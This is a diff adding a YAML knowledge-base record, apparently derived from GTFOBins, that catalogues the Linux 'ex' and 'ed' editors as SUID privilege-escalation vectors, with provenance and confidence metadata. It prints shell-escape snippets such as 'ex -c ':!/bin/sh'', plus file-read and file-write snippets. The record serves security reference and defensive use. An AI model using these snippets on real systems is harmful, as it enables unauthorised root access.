@@ -1,0 +1,132 @@
+id: gtfobins/ex/inherit/suid
+type: binary
+platform: linux
+name: ex
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: ex
+references:
+- https://gtfobins.github.io/gtfobins/ex/
+- https://gtfobins.github.io/gtfobins/ed/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ex:
+          functions:
+            inherit:
+            - code: ex
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              from: ed
+            shell:
+            - code: ex -c ':!/bin/sh'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+        ed:
+          functions:
+            file-read:
+            - binary: false
+              code: 'ed /path/to/input-file
+
+                ,p
+
+                q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - binary: false
+              code: 'ed /path/to/output-file
+
+                a
+
+                DATA
+
+                .
+
+                w
+
+                q'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'ed
+
+                !/bin/sh
+
+                q'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+        red:
+          alias: ed
+    upstream_url: https://gtfobins.github.io/gtfobins/ex/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  - value: privilege-escalation
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:a88735a0dd5ccffff26a79c129d8110b101d6f2016c95a511e369f5d8e94d4cb
